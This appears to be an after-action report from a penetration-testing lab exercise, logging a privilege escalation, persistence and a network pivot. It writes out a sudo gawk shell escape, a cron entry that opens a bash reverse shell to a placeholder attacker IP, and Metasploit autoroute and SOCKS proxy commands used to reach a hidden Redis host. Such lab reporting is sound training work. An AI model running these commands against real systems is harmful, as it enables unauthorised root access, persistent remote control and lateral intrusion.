# OPERATION DEEP PIVOT: AFTER ACTION REPORT
**Operator: Willie** ## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** mercenary
* **Vulnerable Sudo Binary:** [/usr/bin/gawk]
* **GTFOBins Exploit Command Used:** [sudo gawk 'BEGIN {system("/bin/sh")}']

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:** [* * * * * /bin/bash -c 'bash -i >& /dev/tcp/[YOUR_UBUNTU_IP]/4444 0>&1']
* **Persistence Confirmed:** (Yes)

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** [1. sessions -i 1
                                2. run autoroute -s 10.0.10.0/24
                                3. background
                                4. use auxiliary/server/socks_proxy
                                5. set SRVPORT 1080
                                6. set VERSION 4a
                                7. run]
* **Hidden Database IP Discovered:** [10.0.10.50]
* **Open Port on Hidden Database:** [6379 (Redis)]
